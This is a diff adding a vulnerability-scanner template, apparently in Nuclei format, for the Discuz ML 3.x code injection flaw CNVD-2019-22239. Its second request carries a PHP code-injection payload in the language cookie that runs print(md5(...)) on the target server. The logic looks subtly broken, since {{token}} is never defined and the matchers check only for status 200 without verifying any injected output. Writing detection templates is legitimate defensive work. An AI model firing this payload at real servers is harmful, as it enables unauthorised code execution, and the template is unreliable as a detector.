@@ -1,0 +1,32 @@
+id: poc-yaml-discuz-ml3x-cnvd-2019-22239
+
+info:
+  name: poc-yaml-discuz-ml3x-cnvd-2019-22239
+  author: X.Yang
+  severity: high
+  tags: xray-converted,cnvd-2019-22239,ct-158577
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-22239
+
+http:
+  - raw:
+      - |
+        GET /forum.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /forum.php HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: {{token}}language=sc'.print(md5({{rand_int(1000, 9999)}})).'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
